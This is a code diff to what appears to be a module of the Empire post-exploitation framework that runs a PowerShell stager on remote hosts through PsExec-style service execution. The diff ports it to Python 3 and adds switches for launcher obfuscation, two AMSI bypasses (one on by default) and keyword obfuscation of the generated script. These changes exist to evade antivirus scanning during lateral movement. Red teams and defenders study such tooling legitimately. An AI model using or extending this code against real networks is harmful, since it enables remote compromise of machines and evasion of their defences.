@@ -1,6 +1,12 @@
+from __future__ import print_function
+
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -10,6 +16,10 @@ class Module:
             'Author': ['@harmj0y'],
 
             'Description': ('Executes a stager on remote hosts using PsExec type functionality.'),
+
+            'Software': 'S0029',
+
+            'Techniques': ['T1035', 'T1077'],
 
             'Background' : True,
 
@@ -41,6 +51,26 @@ class Module:
                 'Description'   :   'Listener to use.',
                 'Required'      :   False,
                 'Value'         :   ''
+            },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
             },
             'ComputerName' : {
                 'Description'   :   'Host[s] to execute the stager on, comma separated.',
@@ -91,7 +121,12 @@ class Module:
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         listenerName = self.options['Listener']['Value']
         computerName = self.options['ComputerName']['Value']
         serviceName = self.options['ServiceName']['Value']
@@ -100,6 +135,13 @@ class Module:
         proxyCreds = self.options['ProxyCreds']['Value']
         command = self.options['Command']['Value']
         resultFile = self.options['ResultFile']['Value']
+        if (self.options['Obfuscate']['Value']).lower() == 'true':
+            Obfuscate = True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-PsExec.ps1"
@@ -109,7 +151,7 @@ class Module:
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -131,16 +173,16 @@ class Module:
 
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
                 # not a valid listener, return nothing for the script
-                print helpers.color("[!] Invalid listener: " + listenerName)
+                print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
 
             else:
 
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
 
                 if launcher == "":
-                    print helpers.color("[!] Error in launcher generation.")
+                    print(helpers.color("[!] Error in launcher generation."))
                     return ""
                 else:
 
@@ -149,7 +191,10 @@ class Module:
 
 
         scriptEnd += "| Out-String | %{$_ + \"`n\"};"
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
